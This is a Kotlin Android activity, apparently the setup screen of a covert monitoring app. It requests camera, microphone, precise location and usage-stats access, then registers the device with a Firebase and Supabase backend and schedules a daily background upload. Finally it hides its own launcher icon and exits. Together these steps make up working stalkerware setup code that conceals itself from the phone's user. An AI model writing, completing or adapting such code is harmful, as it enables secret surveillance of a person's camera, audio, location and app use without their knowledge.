package com.ikianti.app

import android.Manifest
import android.app.AppOpsManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.*
import com.google.firebase.messaging.ktx.messaging
import com.google.firebase.ktx.Firebase
import com.ikianti.app.worker.DailyUploadWorker
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "MainActivity"
        private const val REQUEST_PERMISSIONS = 1001
    }

    private val requiredPermissions = arrayOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.POST_NOTIFICATIONS
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val missing = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQUEST_PERMISSIONS)
        } else {
            checkUsageStatsPermission()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_PERMISSIONS) checkUsageStatsPermission()
    }

    override fun onResume() {
        super.onResume()
        if (hasUsageStatsPermission()) finishSetup()
    }

    private fun checkUsageStatsPermission() {
        if (!hasUsageStatsPermission()) {
            Toast.makeText(this, "Bitte 'Nutzungszugriff' für diese App aktivieren", Toast.LENGTH_LONG).show()
            startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
        } else {
            finishSetup()
        }
    }

    private fun hasUsageStatsPermission(): Boolean {
        val appOps = getSystemService(APP_OPS_SERVICE) as AppOpsManager
        val mode = appOps.checkOpNoThrow(
            AppOpsManager.OPSTR_GET_USAGE_STATS,
            android.os.Process.myUid(), packageName
        )
        return mode == AppOpsManager.MODE_ALLOWED
    }

    private fun finishSetup() {
        // Eindeutige Geräte-ID holen (wird beim ersten Start generiert)
        val deviceId = DeviceManager.getDeviceId(this)
        Log.d(TAG, "Geräte-ID: $deviceId")

        Firebase.messaging.token.addOnSuccessListener { token ->
            SupabaseApi.upsertDevice(deviceId, token) {
                Log.d(TAG, "Gerät registriert: $deviceId")
                scheduleDailyUpload()
                hideLauncherIcon()
                finish()
            }
        }.addOnFailureListener { e ->
            Log.e(TAG, "FCM-Token Fehler", e)
            Toast.makeText(this, "Firebase-Verbindung prüfen!", Toast.LENGTH_LONG).show()
            scheduleDailyUpload()
            hideLauncherIcon()
            finish()
        }
    }

    private fun scheduleDailyUpload() {
        val request = PeriodicWorkRequestBuilder<DailyUploadWorker>(24, TimeUnit.HOURS)
            .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
            .build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            DailyUploadWorker.WORK_NAME,
            ExistingPeriodicWorkPolicy.KEEP,
            request
        )
    }

    private fun hideLauncherIcon() {
        val alias = ComponentName(this, "com.ikianti.app.LauncherAlias")
        packageManager.setComponentEnabledSetting(
            alias,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}
